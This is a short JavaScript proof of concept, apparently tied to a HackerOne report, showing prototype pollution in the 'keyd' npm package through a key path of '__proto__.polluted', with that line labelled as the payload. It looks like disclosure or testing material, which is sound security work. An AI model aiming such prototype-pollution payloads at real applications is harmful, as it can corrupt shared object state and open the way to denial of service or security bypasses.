//https://hackerone.com/reports/877515
  const keyd = require("keyd");
  keyd({}).set("__proto__.polluted", "yes"); //payload
